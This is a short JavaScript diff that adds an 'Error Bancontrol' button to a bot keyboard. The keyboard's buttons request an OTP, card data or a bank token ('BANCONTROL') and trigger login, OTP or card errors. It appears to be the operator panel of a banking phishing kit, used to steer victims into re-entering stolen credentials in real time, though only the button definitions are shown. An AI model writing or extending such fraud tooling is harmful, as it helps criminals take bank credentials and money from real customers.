@@ -9,7 +9,8 @@ const BUTTONS = {
     [{ text: "✅ OTP", callback_data: "otp" }, { text: "💳 Tarjeta", callback_data: "tarjeta" }],
     [{ text: "🏦 BANCONTROL", callback_data: "bancontrol" }],
     [{ text: "❌ Error Login", callback_data: "error_login" }, { text: "❌ Error OTP", callback_data: "error_otp" }],
-    [{ text: "❌ Error Tarjeta", callback_data: "error_tarjeta" }, { text: "🏁 Finalizar", callback_data: "finalizar" }]
+    [{ text: "❌ Error Tarjeta", callback_data: "error_tarjeta" }, { text: "❌ Error Bancontrol", callback_data: "error_bancontrol" }],
+    [{ text: "🏁 Finalizar", callback_data: "finalizar" }]
   ]
 };
 
